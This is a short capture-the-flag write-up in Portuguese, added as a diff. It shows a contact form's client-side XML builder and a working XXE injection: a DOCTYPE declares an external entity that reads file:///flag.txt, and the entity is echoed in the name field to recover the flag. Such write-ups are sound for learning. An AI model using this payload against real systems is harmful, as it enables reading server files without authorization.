@@ -1,0 +1,79 @@
+É possivel enviar mensagem para contato.
+Ao ver o codigo fonte, tinha a seguinte função:
+
+function XMLFunction(){
+    let name = $('#first_name').val()
+    var xml = '' +
+        '<?xml version="1.0" encoding="UTF-8"?>' +
+        '<contact>' +
+        '<first_name>' + $('#first_name').val() + '</first_name>' +
+        '<last_name>' + $('#last_name').val() + '</last_name>' +
+        '<email>' + $('#email').val() + '</email>' +
+        '<message>' + $('#message').val() + '</message>' +
+        '</contact>';
+    var xmlhttp = new XMLHttpRequest();
+    xmlhttp.onreadystatechange = function () {
+        if(xmlhttp.readyState == 5){
+            console.log(xmlhttp.readyState);
+            console.log(xmlhttp.responseText);
+            document.getElementById('errorMessage').innerHTML = xmlhttp.responseText;
+
+        }
+    }
+    xmlhttp.open("POST","process.php",true);
+    xmlhttp.send(xml);
+    alert('Thanks ' + name + ' for contacting us, your form sent successfully!');
+    
+};
+
+nela é possivel perceber que é dado um alert no nome passado.
+
+passando dados normais, a requisição é feita:
+<?xml version="1.0" encoding="UTF-8"?>
+<contact>
+	<first_name>
+		nome
+	</first_name>
+
+	<last_name>
+		dwdwd
+	</last_name>
+
+	<email>
+		a@d.com
+	</email>
+
+	<message>
+		llllllllll
+	</message>
+
+</contact>
+
+Utilizando o metodo XEE, foi possivel criar uma nova requisição onde é feito a leitura
+do /flag.txt
+
+colocando <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]> na requiisição
+e chamando a entidade com &xxe; no nome:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
+<contact>
+	<first_name>
+		&xxe;
+	</first_name>
+
+	<last_name>
+		dwdwd
+	</last_name>
+
+	<email>
+		a@d.com
+	</email>
+
+	<message>
+		llllllllll
+	</message>
+
+</contact>
+
+Conseguimos a flag: Thank's ALQ{XML_3xt3rn4L_3nt1ty_Att4ck_}, we will contact you soon
